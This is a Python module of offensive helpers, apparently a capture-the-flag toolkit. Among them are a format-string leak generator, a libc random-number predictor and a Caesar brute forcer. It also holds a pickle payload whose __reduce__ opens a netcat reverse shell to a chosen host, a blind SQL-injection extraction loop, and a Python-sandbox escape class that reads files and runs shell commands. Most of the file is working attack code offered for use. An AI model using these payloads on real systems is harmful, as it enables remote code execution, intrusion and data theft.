#!/usr/bin/env python3
import os
import pickle
import string
import time
from ctypes import CDLL
import requests

def format_str_bruteforce(n=100):
	for i in range(n):
		yield f"%{i}$s\n"

def libc_rand():
	libc = CDLL("libc.so.6")
	libc.srand(libc.time(None))
	while True:
		yield libc.rand()

def caesar(s, alphabet_only=True):
	if alphabet_only:
		for i in range(26):
			yield "".join(
				chr((ord(c) + i - 65) % 26 +
				65) if c.isupper() else chr((ord(c) + i - 97) % 26 + 97) if c.islower() else c
				for c in s
			)
	else:  #full ascii
		for i in range(128):
			yield "".join(chr((ord(c) + i) % 128) for c in s if (ord(c) + i) % 128 > 31)

class PickleRevShell:
	def __init__(self, host, port):
		self.host = host
		self.port = port
	
	def __reduce__(self):
		cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.host} {self.port} > /tmp/f"
		return os.system, (cmd, )

def pickle_rev_shell(host, port):
	return pickle.dumps(PickleRevShell(host, port))

_chars = (string.ascii_letters + string.digits + string.punctuation +
	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?"
# make sure that the GLOB and LIKE match 0+ chars don't match and the match 1 char only matches if nothing else can match

def blind_sqli(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while True:
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except requests.exceptions.ConnectionError:  # really bad error handling
				time.sleep(1)
				break
		else:
			return val

class PyJail:
	"""makes interacting with python jails easier"""
	def __init__(self, fn):
		""" fn is the function to interact with the pyjail that takes and returns a string """
		self.fn = fn
		subclasses = "''.__class__.mro()[1].__subclasses__()"
		self.builtins = f"{subclasses}[-1].__init__.__globals__['__builtins__']"
	
	def exec(self, s: str):
		"""directly run with s appended to self.builtins"""
		return self.fn(self.builtins + s)
	
	def call(self, fn: str, *args, module=None):
		if module is None:  # call builtin
			return self.exec(f"[{fn!r}](*{args!r})")
		else:  # import module and then call function
			return self.exec(f"['__import__']({module!r}).{fn}(*{args!r})")
	
	def cat(self, fn):
		return self.exec(f"['open']({fn!r}).read()")
	
	def ls(self, folder="."):
		return self.call("listdir", folder, module="os")
	
	def shell(self, cmd):
		return self.exec(f"['__import__']('os').popen({cmd!r}).read()")